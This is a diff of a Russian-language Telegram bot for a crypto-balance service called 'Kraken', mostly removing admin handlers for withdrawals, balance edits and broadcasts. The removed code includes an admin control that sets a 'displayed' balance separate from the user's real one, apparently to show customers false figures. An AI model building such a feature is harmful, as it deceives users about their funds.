-                    text += "\n"
-                    
-                    if withdrawal.status == "pending":
-                        text += "\n⚠️ <b>ПРОЦЕСС ВЫВОДА:</b>\n"
-                        text += "1️⃣ При одобрении USDT списываются с баланса пользователя\n"
-                        text += "2️⃣ USDT автоматически переводятся на ваш Crypto Bot кошелек\n"
-                        text += "3️⃣ Вы вручную переводите рубли на карту клиента\n"
-                    
-                    if withdrawal.admin_notes:
-                        text += f"\n📝 <b>Заметки:</b> {withdrawal.admin_notes}\n"
-                    
-                    # Buttons
-                    buttons = []
-                    if withdrawal.status in ["pending", "processing"]:
-                        buttons.append([{"text": "✅ Одобрить (списать USDT → перевести вам)", "callback_data": f"admin:withdraw:approve:{withdrawal.id}"}])
-                        buttons.append([{"text": "✏️ Изменить", "callback_data": f"admin:withdraw:modify:{withdrawal.id}"}])
-                        buttons.append([{"text": "❌ Отменить заявку", "callback_data": f"admin:withdraw:cancel:{withdrawal.id}"}])
-                    
-                    buttons.append([{"text": "🔙 Назад к списку", "callback_data": "admin:withdrawals"}])
-                    await bot_send_message(chat_id, text, buttons, parse_mode="HTML")
+                        await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден")
             
-            # Admin: Approve withdrawal
-            elif data.startswith("admin:withdraw:approve:") and str(chat_id) == str(ADMIN_ID):
-                withdrawal_id = int(data.split(":", 3)[3])
-                withdrawal = (await db.execute(select(Withdrawal).where(Withdrawal.id == withdrawal_id))).scalars().first()
-                if withdrawal:
-                    user = (await db.execute(select(User).where(User.id == withdrawal.user_id))).scalars().first()
-                    
-                    # Check if already processed
-                    if withdrawal.status == "completed":
-                        await bot_send_message(chat_id, "⚠️ Эта заявка уже обработана!", [[{"text": "🔙 К заявкам", "callback_data": "admin:withdrawals"}]], parse_mode="HTML")
-                        return {"ok": True}
-                    
-                    # Check balance
-                    if not user or user.balance_usdt < withdrawal.usdt_required:
-                        text = f"❌ <b>Недостаточно средств!</b>\n\n"
-                        text += f"Требуется: {withdrawal.usdt_required:.2f} USDT\n"
-                        text += f"Баланс пользователя: {user.balance_usdt if user else 0:.2f} USDT"
-                        await bot_send_message(chat_id, text, [[{"text": "🔙 К заявке", "callback_data": f"admin:withdraw:{withdrawal_id}"}]], parse_mode="HTML")
-                        return {"ok": True}
-                    
-                    # Deduct from REAL balance
-                    old_balance = user.balance_usdt
-                    user.balance_usdt -= withdrawal.usdt_required
-                    withdrawal.status = "completed"
-                    withdrawal.completed_at = datetime.utcnow()
-                    withdrawal.admin_processed_by = str(ADMIN_ID)
-                    
-                    # Update transaction in history
-                    trx = (await db.execute(
-                        select(Transaction)
-                        .where(Transaction.user_id == user.id, Transaction.type == "withdrawal", Transaction.status == "pending")
-                        .order_by(Transaction.created_at.desc())
-                    )).scalars().first()
-                    if trx:
-                        trx.status = "done"
-                    
-                    await db.commit()
-                    
-                    # TODO: Transfer USDT to admin's Crypto Bot wallet via Crypto Pay API
-                    # This would require implementing the transfer API call
-                    
-                    # Notify admin with success message
-                    text = f"✅ <b>Заявка #{withdrawal.id} одобрена!</b>\n\n"
-                    user_info = format_user_info(user)
-                    text += f"👤 Пользователь: {user_info}\n"
-                    text += f"💰 Старый баланс: {old_balance:.2f} USDT\n"
-                    text += f"📉 Списано: {withdrawal.usdt_required:.2f} USDT\n"
-                    text += f"💎 Новый баланс: {user.balance_usdt:.2f} USDT\n\n"
-                    
-                    text += f"💸 К выводу: {withdrawal.amount_rub:,.0f} ₽\n"
-                    if not withdrawal.modified_to_crypto:
-                        text += f"💳 Карта: •••• {withdrawal.card_number or '****'}\n"
-                        text += f"📝 ФИО: {withdrawal.full_name}\n\n"
-                        text += "⚠️ <b>Теперь переведите рубли на карту клиента!</b>"
-                    
-                    buttons = [
-                        [{"text": "✅ Готово", "callback_data": "admin:withdrawals"}],
-                        [{"text": "📋 Другие заявки", "callback_data": "admin:withdrawals"}]
-                    ]
-                    
-                    await bot_send_message(chat_id, text, buttons, parse_mode="HTML")
-                    
-                    # Notify user
-                    try:
-                        user_text = f"✅ <b>Ваша заявка на вывод одобрена!</b>\n\n"
-                        user_text += f"📤 Заявка #{withdrawal.id}\n"
-                        user_text += f"💰 Сумма: {withdrawal.amount_rub:,.0f} ₽\n\n"
-                        user_text += "Средства будут переведены на вашу карту в течение 15 минут."
-                        await bot_send_message(int(user.telegram_id), user_text, parse_mode="HTML")
-                    except:
-                        pass
-                else:
-                    await bot_send_message(chat_id, "❌ Заявка не найдена")
-            
-            # Admin: Cancel withdrawal
-            elif data.startswith("admin:withdraw:cancel:") and str(chat_id) == str(ADMIN_ID):
-                withdrawal_id = int(data.split(":", 3)[3])
-                withdrawal = (await db.execute(select(Withdrawal).where(Withdrawal.id == withdrawal_id))).scalars().first()
-                if withdrawal:
-                    # Check if already processed
-                    if withdrawal.status in ["completed", "cancelled"]:
-                        await bot_send_message(chat_id, "⚠️ Эта заявка уже обработана!", [[{"text": "🔙 К заявкам", "callback_data": "admin:withdrawals"}]], parse_mode="HTML")
-                        return {"ok": True}
-                    
-                    user = (await db.execute(select(User).where(User.id == withdrawal.user_id))).scalars().first()
-                    
-                    # Return funds to user (real balance) - return full USDT amount including fee
+            # Handle manage:block callback - toggle block status
+            elif data.startswith("manage:block:"):
+                if str(chat_id) == str(ADMIN_ID):
+                    profile_id = int(data.split(":")[2])
+                    user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
                     if user:
-                        old_balance = user.balance_usdt
-                        user.balance_usdt += withdrawal.usdt_required  # Return full amount including fee
-                    
-                    withdrawal.status = "cancelled"
-                    withdrawal.completed_at = datetime.utcnow()
-                    withdrawal.admin_processed_by = str(ADMIN_ID)
-                    withdrawal.admin_notes = f"Отменена администратором {datetime.utcnow().strftime('%d.%m.%Y %H:%M')}"
-                    
-                    # Update transaction
-                    trx = (await db.execute(
-                        select(Transaction)
-                        .where(Transaction.user_id == user.id, Transaction.type == "withdrawal", Transaction.status == "pending")
-                        .order_by(Transaction.created_at.desc())
-                    )).scalars().first()
-                    if trx:
-                        trx.status = "cancelled"
-                    
-                    await db.commit()
-                    
-                    # Notify admin
-                    text = f"❌ <b>Заявка #{withdrawal.id} отменена!</b>\n\n"
+                        if user.is_blocked:
+                            user.is_blocked = False
+                            user.block_reason = None
+                            await db.commit()
+                            await bot_send_message(chat_id, f"✅ Пользователь #{profile_id} разблокирован")
+                            try:
+                                await bot_send_message(int(user.telegram_id), "✅ Ваш аккаунт разблокирован. Добро пожаловать!")
+                            except:
+                                pass
+                        else:
+                            user.is_blocked = True
+                            await db.commit()
+                            await bot_send_message(chat_id, f"🚫 Пользователь #{profile_id} заблокирован\n\n💡 Для указания причины используйте:\n/block {profile_id} ПРИЧИНА")
+                            try:
+                                await bot_send_message(int(user.telegram_id), "🚫 Ваш аккаунт заблокирован администратором.")
+                            except:
+                                pass
+                        
+                        buttons = [[{"text": "🔙 К пользователю", "callback_data": f"select_user:{profile_id}"}]]
+                        await bot_send_message(chat_id, "Выберите действие:", buttons)
+                    else:
+                        await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден")
+            
+            # Handle manage:balance callback - prompt for balance command
+            elif data.startswith("manage:balance:"):
+                if str(chat_id) == str(ADMIN_ID):
+                    profile_id = int(data.split(":")[2])
+                    user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
                     if user:
-                        user_info = format_user_info(user)
-                        text += f"👤 Пользователь: {user_info}\n"
-                        text += f"💰 Старый баланс: {old_balance:.2f} USDT\n"
-                        text += f"📈 Возвращено: {withdrawal.usdt_required:.2f} USDT\n"
-                        text += f"💎 Новый баланс: {user.balance_usdt:.2f} USDT\n\n"
-                    text += f"Заявка успешно отменена, средства возвращены пользователю включая комиссию."
-                    
-                    buttons = [[{"text": "✅ Понятно", "callback_data": "admin:withdrawals"}]]
-                    await bot_send_message(chat_id, text, buttons, parse_mode="HTML")
-                    
-                    # Notify user
-                    if user:
-                        try:
-                            user_text = f"⚠️ <b>Ваша заявка на вывод отменена</b>\n\n"
-                            user_text += f"📤 Заявка #{withdrawal.id}\n"
-                            user_text += f"💰 Возвращено на баланс: {withdrawal.usdt_required:.2f} USDT\n"
-                            user_text += f"💎 Ваш баланс: {user.balance_usdt:.2f} USDT\n\n"
-                            user_text += "Полная сумма включая комиссию возвращена на ваш баланс.\n"
-                            user_text += "Если у вас есть вопросы, обратитесь в поддержку."
-                            await bot_send_message(int(user.telegram_id), user_text, parse_mode="HTML")
-                        except:
-                            pass
-                else:
-                    await bot_send_message(chat_id, "❌ Заявка не найдена")
+                        msg = f"💰 <b>Управление балансом #{profile_id}</b>\n\n"
+                        msg += f"Текущий баланс: {user.balance_usdt:.2f} USDT\n\n"
+                        msg += f"<b>Используйте команды:</b>\n"
+                        msg += f"<code>/addbalance {profile_id} +50</code> - добавить 50 USDT\n"
+                        msg += f"<code>/addbalance {profile_id} -20</code> - снять 20 USDT\n"
+                        msg += f"<code>/setbalance {profile_id} 100</code> - установить 100 USDT"
+                        
+                        buttons = [[{"text": "🔙 К пользователю", "callback_data": f"select_user:{profile_id}"}]]
+                        await bot_send_message(chat_id, msg, buttons, parse_mode="HTML")
+                    else:
+                        await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден")
             
-            # Admin: Modify withdrawal
-            elif data.startswith("admin:withdraw:modify:") and str(chat_id) == str(ADMIN_ID):
-                withdrawal_id = int(data.split(":", 3)[3])
-                text = "✏️ <b>Изменение заявки</b>\n\nВыберите действие:"
-                buttons = [
-                    [{"text": "💎 Сменить на крипто", "callback_data": f"admin:withdraw:tocrypto:{withdrawal_id}"}],
-                    [{"text": "💰 Изменить сумму", "callback_data": f"admin:withdraw:amount:{withdrawal_id}"}],
-                    [{"text": "🔙 Назад", "callback_data": f"admin:withdraw:{withdrawal_id}"}]
-                ]
-                await bot_send_message(chat_id, text, buttons)
-            
-            # Admin: Change to crypto withdrawal (simplified - just mark as modified)
-            elif data.startswith("admin:withdraw:tocrypto:") and str(chat_id) == str(ADMIN_ID):
-                withdrawal_id = int(data.split(":", 3)[3])
-                withdrawal = (await db.execute(select(Withdrawal).where(Withdrawal.id == withdrawal_id))).scalars().first()
-                if withdrawal:
-                    withdrawal.modified_to_crypto = True
-                    withdrawal.modified_by_admin = True
-                    withdrawal.crypto_currency = "USDT"
-                    withdrawal.crypto_address = "TВаш_адрес_здесь"  # Admin needs to update manually
-                    withdrawal.admin_notes = "Переведено на крипто-вывод"
-                    await db.commit()
-                    await bot_send_message(chat_id, f"✅ Заявка #{withdrawal.id} переведена на крипто-вывод\n\n⚠️ Укажите адрес кошелька вручную в БД", [[{"text": "🔙 Назад", "callback_data": f"admin:withdraw:{withdrawal_id}"}]])
-                else:
-                    await bot_send_message(chat_id, "❌ Заявка не найдена")
-            
-            # Admin: Balance management menu
-            elif data == "admin:balance" and str(chat_id) == str(ADMIN_ID):
-                text = "💰 <b>Управление балансом</b>\n\nВведите Profile ID пользователя:"
-                admin_balance_state[str(ADMIN_ID)] = {"action": "select_user"}
-                buttons = [
-                    [{"text": "📋 Последние пользователи", "callback_data": "admin:balance:recent"}],
-                    [{"text": "🔙 Назад", "callback_data": "admin:menu"}]
-                ]
-                await bot_send_message(chat_id, text, buttons, parse_mode="HTML")
-            
-            # Admin: Show recent users for balance management
-            elif data == "admin:balance:recent" and str(chat_id) == str(ADMIN_ID):
-                users = (await db.execute(select(User).order_by(User.created_at.desc()).limit(5))).scalars().all()
-                text = "💰 <b>Выберите пользователя:</b>\n\n"
-                buttons = []
-                for u in users:
-                    real_bal = u.balance_usdt or 0.0
-                    user_display = format_user_display(u)
-                    button_text = f"{user_display} | {real_bal:.2f} USDT"
-                    buttons.append([{"text": button_text, "callback_data": f"admin:balance:user:{u.profile_id}"}])
-                buttons.append([{"text": "🔙 Назад", "callback_data": "admin:balance"}])
-                await bot_send_message(chat_id, text, buttons, parse_mode="HTML")
-            
-            # Admin: Selected user for balance management
-            elif data.startswith("admin:balance:user:") and str(chat_id) == str(ADMIN_ID):
-                profile_id = int(data.split(":", 3)[3])
-                user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
-                if user:
-                    admin_balance_state[str(ADMIN_ID)] = {"action": "select_action", "profile_id": profile_id}
-                    real_bal = user.balance_usdt or 0.0
-                    display_bal = user.display_balance_usdt if user.display_balance_usdt is not None else real_bal
-                    user_info = format_user_info(user)
-                    text = f"👤 <b>Пользователь: {user_info}</b>\n"
-                    text += f"💰 Реальный баланс: {real_bal:.2f} USDT\n"
-                    text += f"🎭 Отображаемый: {display_bal:.2f} USDT\n\n"
-                    text += "Выберите действие:"
-                    
-                    buttons = [
-                        [{"text": "➕ Пополнить", "callback_data": f"admin:balance:add:{profile_id}"}],
-                        [{"text": "➖ Списать", "callback_data": f"admin:balance:subtract:{profile_id}"}],
-                        [{"text": "✏️ Установить точную сумму", "callback_data": f"admin:balance:set:{profile_id}"}],
-                        [{"text": "🎭 Изменить отображаемый", "callback_data": f"admin:balance:display:{profile_id}"}],
-                        [{"text": "🔙 Назад", "callback_data": "admin:balance"}]
-                    ]
-                    await bot_send_message(chat_id, text, buttons, parse_mode="HTML")
-                else:
-                    await bot_send_message(chat_id, "❌ Пользователь не найден", [[{"text": "🔙 Назад", "callback_data": "admin:balance"}]])
-            
-            # Admin: Add balance - show quick amounts
-            elif data.startswith("admin:balance:add:") and str(chat_id) == str(ADMIN_ID):
-                profile_id = int(data.split(":", 3)[3])
-                admin_balance_state[str(ADMIN_ID)] = {"action": "add_balance", "profile_id": profile_id}
-                text = f"➕ <b>Пополнение баланса #{profile_id}</b>\n\nВыберите сумму или введите свою:"
-                buttons = [
-                    [{"text": "+10 USDT", "callback_data": f"admin:balance:add:confirm:{profile_id}:10"}],
-                    [{"text": "+50 USDT", "callback_data": f"admin:balance:add:confirm:{profile_id}:50"}],
-                    [{"text": "+100 USDT", "callback_data": f"admin:balance:add:confirm:{profile_id}:100"}],
-                    [{"text": "+500 USDT", "callback_data": f"admin:balance:add:confirm:{profile_id}:500"}],
-                    [{"text": "✏️ Ввести другую сумму", "callback_data": f"admin:balance:add:custom:{profile_id}"}],
-                    [{"text": "🔙 Назад", "callback_data": f"admin:balance:user:{profile_id}"}]
-                ]
-                await bot_send_message(chat_id, text, buttons, parse_mode="HTML")
-            
-            # Admin: Subtract balance - show quick amounts
-            elif data.startswith("admin:balance:subtract:") and str(chat_id) == str(ADMIN_ID):
-                profile_id = int(data.split(":", 3)[3])
-                admin_balance_state[str(ADMIN_ID)] = {"action": "subtract_balance", "profile_id": profile_id}
-                text = f"➖ <b>Списание с баланса #{profile_id}</b>\n\nВыберите сумму или введите свою:"
-                buttons = [
-                    [{"text": "-10 USDT", "callback_data": f"admin:balance:sub:confirm:{profile_id}:10"}],
-                    [{"text": "-50 USDT", "callback_data": f"admin:balance:sub:confirm:{profile_id}:50"}],
-                    [{"text": "-100 USDT", "callback_data": f"admin:balance:sub:confirm:{profile_id}:100"}],
-                    [{"text": "✏️ Ввести другую сумму", "callback_data": f"admin:balance:sub:custom:{profile_id}"}],
-                    [{"text": "🔙 Назад", "callback_data": f"admin:balance:user:{profile_id}"}]
-                ]
-                await bot_send_message(chat_id, text, buttons, parse_mode="HTML")
-            
-            # Admin: Confirm add balance
-            elif data.startswith("admin:balance:add:confirm:") and str(chat_id) == str(ADMIN_ID):
-                parts = data.split(":")
-                profile_id = int(parts[4])
-                amount = float(parts[5])
-                
-                # Execute the balance addition using the existing command handler
-                await bot_send_message(chat_id, f"⏳ Добавляю {amount} USDT...")
-                # Call the addbalance logic directly
-                result = await execute_balance_change(db, profile_id, amount, "add", chat_id)
-                if result["ok"]:
-                    buttons = [[{"text": "💰 Другая операция", "callback_data": f"admin:balance:user:{profile_id}"}],
-                              [{"text": "🔙 Главное меню", "callback_data": "admin:menu"}]]
-                    await bot_send_message(chat_id, result["message"], buttons, parse_mode="HTML")
-                else:
-                    await bot_send_message(chat_id, result["message"], [[{"text": "🔙 Назад", "callback_data": f"admin:balance:add:{profile_id}"}]], parse_mode="HTML")
-                admin_balance_state.pop(str(ADMIN_ID), None)
-            
-            # Admin: Confirm subtract balance
-            elif data.startswith("admin:balance:sub:confirm:") and str(chat_id) == str(ADMIN_ID):
-                parts = data.split(":")
-                profile_id = int(parts[4])
-                amount = float(parts[5])
-                
-                # Execute the balance subtraction
-                await bot_send_message(chat_id, f"⏳ Списываю {amount} USDT...")
-                result = await execute_balance_change(db, profile_id, -amount, "add", chat_id)
-                if result["ok"]:
-                    buttons = [[{"text": "💰 Другая операция", "callback_data": f"admin:balance:user:{profile_id}"}],
-                              [{"text": "🔙 Главное меню", "callback_data": "admin:menu"}]]
-                    await bot_send_message(chat_id, result["message"], buttons, parse_mode="HTML")
-                else:
-                    await bot_send_message(chat_id, result["message"], [[{"text": "🔙 Назад", "callback_data": f"admin:balance:subtract:{profile_id}"}]], parse_mode="HTML")
-                admin_balance_state.pop(str(ADMIN_ID), None)
-            
-            # Admin: Custom amount input prompts
-            elif data.startswith("admin:balance:add:custom:") and str(chat_id) == str(ADMIN_ID):
-                profile_id = int(data.split(":", 4)[4])
-                admin_balance_state[str(ADMIN_ID)] = {"action": "input_add_amount", "profile_id": profile_id}
-                await bot_send_message(chat_id, f"💰 Введите сумму для пополнения баланса #{profile_id}:\n\nПример: 250.50", parse_mode="HTML")
-            
-            elif data.startswith("admin:balance:sub:custom:") and str(chat_id) == str(ADMIN_ID):
-                profile_id = int(data.split(":", 4)[4])
-                admin_balance_state[str(ADMIN_ID)] = {"action": "input_sub_amount", "profile_id": profile_id}
-                await bot_send_message(chat_id, f"💸 Введите сумму для списания с баланса #{profile_id}:\n\nПример: 75.25", parse_mode="HTML")
-            
-            elif data.startswith("admin:balance:set:") and str(chat_id) == str(ADMIN_ID):
-                profile_id = int(data.split(":", 3)[3])
-                admin_balance_state[str(ADMIN_ID)] = {"action": "input_set_amount", "profile_id": profile_id}
-                await bot_send_message(chat_id, f"✏️ Введите новый баланс для пользователя #{profile_id}:\n\nПример: 1000.00", parse_mode="HTML")
-            
-            elif data.startswith("admin:balance:display:") and str(chat_id) == str(ADMIN_ID):
-                profile_id = int(data.split(":", 3)[3])
-                admin_balance_state[str(ADMIN_ID)] = {"action": "input_display_amount", "profile_id": profile_id}
-                await bot_send_message(chat_id, f"🎭 Введите отображаемый баланс для пользователя #{profile_id}:\n\nПример: 5000.00", parse_mode="HTML")
-            
-            # Admin: Back to main menu
-            elif data == "admin:menu" and str(chat_id) == str(ADMIN_ID):
-                buttons = [
-                    [{"text": "📢 Сделать рассылку", "callback_data": "admin:broadcast_menu"}],
-                    [{"text": "✉️ Отправить сообщение пользователю", "callback_data": "admin:send_user_message"}],
-                    [{"text": "👥 Пользователи", "callback_data": "admin:users"}, {"text": "💸 Выводы", "callback_data": "admin:withdrawals"}],
-                    [{"text": "📊 Статистика", "callback_data": "admin:stats"}, {"text": "💰 Баланс", "callback_data": "admin:balance"}],
-                    [{"text": "🚪 Выйти из админки", "callback_data": "admin:exit"}]
-                ]
-                await bot_send_message(chat_id, "🔐 <b>Админ панель Kraken</b>\n\nВыберите раздел:", buttons, parse_mode="HTML")
-            
-            # Admin: Exit admin panel - return to user menu
-            elif data == "admin:exit" and str(chat_id) == str(ADMIN_ID):
-                buttons = [
-                    [{"text": "🚀 Открыть приложение", "web_app": {"url": HOST_BASE}}],
-                    [{"text": "💰 Мой баланс", "callback_data": "user:balance"}, {"text": "👥 Пригласить друга", "callback_data": "user:referral"}],
-                    [{"text": "💬 Поддержка", "callback_data": "user:support"}, {"text": "📊 История", "callback_data": "user:history"}],
-                    [{"text": "🔐 Админ панель", "callback_data": "admin:menu"}]
-                ]
-                await bot_send_message(chat_id, "🐙 <b>Главное меню Kraken</b>\n\nВыберите действие:", buttons, parse_mode="HTML")
-            
-            # Admin: Broadcast menu
-            elif data == "admin:broadcast_menu" and str(chat_id) == str(ADMIN_ID):
-                total_users = (await db.execute(select(func.count(User.id)))).scalar() or 0
-                buttons = [
-                    [{"text": "📢 Рассылка всем пользователям", "callback_data": "broadcast:select_all"}],
-                    [{"text": "🎯 Ограниченная рассылка", "callback_data": "broadcast:select_limited"}],
-                    [{"text": "🔙 Назад", "callback_data": "admin:menu"}]
-                ]
-                await bot_send_message(chat_id, f"📢 <b>Рассылка сообщений</b>\n\n👥 Всего пользователей: {total_users}\n\nВыберите тип рассылки:", buttons, parse_mode="HTML")
-            
-            # Admin: Send user message prompt
-            elif data == "admin:send_user_message" and str(chat_id) == str(ADMIN_ID):
-                text = "✉️ <b>Отправка личного сообщения</b>\n\nОтправьте сообщение в формате:\n\n<code>/send_message PROFILE_ID текст сообщения</code>\n\nПример:\n<code>/send_message 100001 Здравствуйте! Ваш аккаунт активирован</code>\n\n💡 Вы также можете указать только Profile ID, и бот попросит ввести текст сообщения."
-                buttons = [[{"text": "🔙 Назад", "callback_data": "admin:menu"}]]
-                await bot_send_message(chat_id, text, buttons, parse_mode="HTML")
-            
-            # Broadcast: Select all users (show delivery channel selection)
-            elif data == "broadcast:select_all" and str(chat_id) == str(ADMIN_ID):
-                total_users = (await db.execute(select(func.count(User.id)))).scalar() or 0
-                buttons = [
-                    [{"text": "📱 В приложение", "callback_data": "broadcast:all:app_chat"}],
-                    [{"text": "💬 В Telegram бот", "callback_data": "broadcast:all:telegram_chat"}],
-                    [{"text": "🔙 Назад", "callback_data": "admin:broadcast_menu"}]
-                ]
-                await bot_send_message(chat_id, f"📢 <b>Массовая рассылка всем</b>\n\n👥 Получателей: {total_users}\n\n🎯 Выберите канал доставки:", buttons, parse_mode="HTML")
-            
-            # Broadcast: Select limited (ask for count)
-            elif data == "broadcast:select_limited" and str(chat_id) == str(ADMIN_ID):
-                text = "🎯 <b>Ограниченная рассылка</b>\n\nОтправьте количество пользователей для рассылки:\n\n<code>/broadcast_limited КОЛИЧЕСТВО</code>\n\nПример:\n<code>/broadcast_limited 50</code>\n\n💡 Сообщение будет отправлено N самым последним зарегистрированным пользователям."
-                buttons = [[{"text": "🔙 Назад", "callback_data": "admin:broadcast_menu"}]]
-                await bot_send_message(chat_id, text, buttons, parse_mode="HTML")
-            
-            # ========== BROADCAST CALLBACKS ==========
-            # Broadcast: All users with selected delivery type
-            elif data.startswith("broadcast:all:") and str(chat_id) == str(ADMIN_ID):
-                delivery_type = data.split(":", 2)[2]
-                total_users = (await db.execute(select(func.count(User.id)))).scalar() or 0
-                admin_broadcast_state[str(ADMIN_ID)] = {"type": "all", "target": None, "delivery": delivery_type}
-                
-                delivery_label = "в приложении" if delivery_type == "app_chat" else "в Telegram боте"
-                await bot_send_message(chat_id, f"📢 <b>Массовая рассылка всем</b>\n\n👥 Получателей: {total_users}\n📱 Канал: {delivery_label}\n\n📝 Отправьте текст сообщения\n\nДля отмены: /cancel", parse_mode="HTML")
-            
-            # Broadcast: Limited users with selected delivery type
-            elif data.startswith("broadcast:limited:") and str(chat_id) == str(ADMIN_ID):
-                parts = data.split(":", 3)
-                count = int(parts[2])
-                delivery_type = parts[3]
-                admin_broadcast_state[str(ADMIN_ID)] = {"type": "limited", "target": count, "delivery": delivery_type}
-                
-                delivery_label = "в приложении" if delivery_type == "app_chat" else "в Telegram боте"
-                await bot_send_message(chat_id, f"🎯 <b>Ограниченная рассылка</b>\n\n👥 Получателей: {count}\n📱 Канал: {delivery_label}\n\n📝 Отправьте текст сообщения\n\nДля отмены: /cancel", parse_mode="HTML")
-            
-            # ========== END ADMIN PANEL CALLBACKS ==========
+            # ========== END ADMIN USER MANAGEMENT CALLBACKS ==========
             
             # ========== USER MENU CALLBACKS ==========
             # User: Show balance
@@ -2595,135 +2450,14 @@ We'll respond as quickly as possible! ⚡"""
             # User: Back to main menu
             elif data == "user:menu":
                 user = (await db.execute(select(User).where(User.telegram_id==str(chat_id)))).scalars().first()
-                if str(chat_id) == str(ADMIN_ID):
-                    buttons = [
-                        [{"text": "🚀 Открыть приложение", "web_app": {"url": HOST_BASE}}],
-                        [{"text": "💰 Мой баланс", "callback_data": "user:balance"}, {"text": "👥 Пригласить друга", "callback_data": "user:referral"}],
-                        [{"text": "💬 Поддержка", "callback_data": "user:support"}, {"text": "📊 История", "callback_data": "user:history"}],
-                        [{"text": "🔐 Админ панель", "callback_data": "admin:menu"}]
-                    ]
-                else:
-                    buttons = [
-                        [{"text": "🚀 Открыть приложение", "web_app": {"url": HOST_BASE}}],
-                        [{"text": "💰 Мой баланс", "callback_data": "user:balance"}, {"text": "👥 Пригласить друга", "callback_data": "user:referral"}],
-                        [{"text": "💬 Поддержка", "callback_data": "user:support"}, {"text": "📊 История", "callback_data": "user:history"}]
-                    ]
+                buttons = [
+                    [{"text": "🚀 Открыть приложение", "web_app": {"url": HOST_BASE}}],
+                    [{"text": "💰 Мой баланс", "callback_data": "user:balance"}, {"text": "👥 Пригласить друга", "callback_data": "user:referral"}],
+                    [{"text": "💬 Поддержка", "callback_data": "user:support"}, {"text": "📊 История", "callback_data": "user:history"}]
+                ]
                 await bot_send_message(chat_id, "🐙 <b>Главное меню Kraken</b>\n\nВыберите действие:", buttons, parse_mode="HTML")
             
             # ========== END USER MENU CALLBACKS ==========
-            
-            elif data.startswith("check_deposit:"):
-                invoice_id=data.split(":",1)[1]
-                print(f"[CHECK_DEPOSIT] User {chat_id} checking invoice {invoice_id}")
-                async with aiohttp.ClientSession() as s:
-                    # Передаем telegram_id пользователя в заголовках
-                    headers = {"X-Telegram-Id": str(chat_id)}
-                    async with s.get(f"{HOST_BASE}/api/check_deposit", params={"invoice_id": invoice_id}, headers=headers) as r:
-                        st=await r.json()
-                        print(f"[CHECK_DEPOSIT] Result: {st}")
-                        if st.get("paid"): 
-                            amount = st.get('amount', 0)
-                            new_balance = st.get('new_balance', 0)
-                            await bot_send_message(chat_id, f"✅ <b>Платеж подтвержден!</b>\n\n💰 Сумма: {amount} USDT\n💵 Ваш баланс: {round(new_balance, 2)} USDT\n\n🎉 Средства успешно зачислены на ваш счет!", parse_mode="HTML")
-                        else: 
-                            await bot_send_message(chat_id, "⏳ <b>Платеж в обработке</b>\n\nПлатеж еще не поступил. Пожалуйста, подождите несколько минут и попробуйте еще раз.\n\nЕсли вы оплатили счет, средства будут зачислены автоматически.", parse_mode="HTML")
-            
-            # Handle withdrawal approval
-            elif data.startswith("approve_withdraw:"):
-                if str(chat_id) == str(ADMIN_ID):
-                    withdrawal_id = int(data.split(":",1)[1])
-                    # Получаем запись вывода
-                    withdrawal = (await db.execute(select(Withdrawal).where(Withdrawal.id == withdrawal_id))).scalars().first()
-                    if withdrawal:
-                        # Проверяем, что вывод ещё не обработан
-                        if withdrawal.status == "completed":
-                            await bot_send_message(chat_id, f"✅ Вывод #{withdrawal_id} уже одобрен")
-                            return {"ok": True}
-                        
-                        # Получаем пользователя
-                        user = (await db.execute(select(User).where(User.id == withdrawal.user_id))).scalars().first()
-                        
-                        # Funds ALREADY deducted and transferred to admin wallet!
-                        # Just update status to confirm card transfer is done
-                        withdrawal.status = "completed"
-                        withdrawal.completed_at = datetime.utcnow()
-                        
-                        await db.commit()
-                        
-                        # Уведомляем администратора
-                        user_display = format_user_display(user) if user else "N/A"
-                        await bot_send_message(chat_id, f"✅ <b>Вывод #{withdrawal_id} завершен!</b>\n\n💰 Сумма: {withdrawal.amount_rub:,.0f} ₽\n👤 Пользователь: {user_display}\n\n✅ USDT уже у вас на кошельке\n✅ Подтверждено, что рубли переведены на карту", parse_mode="HTML")
-                        
-                        # Уведомляем пользователя
-                        if user:
-                            try:
-                                await bot_send_message(int(user.telegram_id), f"✅ <b>Деньги переведены!</b>\n\n💰 Сумма: {withdrawal.amount_rub:,.0f} ₽\n💳 На карту: **** {withdrawal.card_number}\n\n📊 Статус: <b>Завершено</b>\n\nПроверьте свою банковскую карту.", parse_mode="HTML")
-                            except: pass
-                    else:
-                        await bot_send_message(chat_id, "❌ Вывод не найден")
-            
-            # Handle withdrawal cancellation
-            elif data.startswith("cancel_withdraw:"):
-                if str(chat_id) == str(ADMIN_ID):
-                    withdrawal_id = int(data.split(":",1)[1])
-                    # Получаем запись вывода
-                    withdrawal = (await db.execute(select(Withdrawal).where(Withdrawal.id == withdrawal_id))).scalars().first()
-                    if withdrawal:
-                        # Проверяем, что вывод ещё не завершен
-                        if withdrawal.status == "completed":
-                            await bot_send_message(chat_id, f"❌ Вывод #{withdrawal_id} уже завершен, отменить невозможно")
-                            return {"ok": True}
-                        elif withdrawal.status == "cancelled":
-                            await bot_send_message(chat_id, f"⚠️ Вывод #{withdrawal_id} уже отменен")
-                            return {"ok": True}
-                        
-                        # Получаем пользователя
-                        user = (await db.execute(select(User).where(User.id == withdrawal.user_id))).scalars().first()
-                        
-                        # ВАЖНО: Возвращаем деньги пользователю!
-                        # Деньги УЖЕ были списаны при создании заявки
-                        # USDT уже на кошельке админа - админу нужно вернуть их вручную через @CryptoBot
-                        if user:
-                            # Get original amount (from transaction details)
-                            trx = (await db.execute(select(Transaction).where(
-                                Transaction.user_id == withdrawal.user_id,
-                                Transaction.type == "withdraw",
-                                Transaction.details.contains({"withdrawal_id": withdrawal.id})
-                            ).order_by(Transaction.created_at.desc()))).scalars().first()
-                            
-                            refund_amount = trx.amount if trx else withdrawal.usdt_required
-                            user.balance_usdt = (user.balance_usdt or 0) + refund_amount
-                        
-                        # Обновляем статус на "cancelled"
-                        withdrawal.status = "cancelled"
-                        
-                        await db.commit()
-                        
-                        # Уведомляем администратора
-                        user_display = format_user_display(user) if user else "N/A"
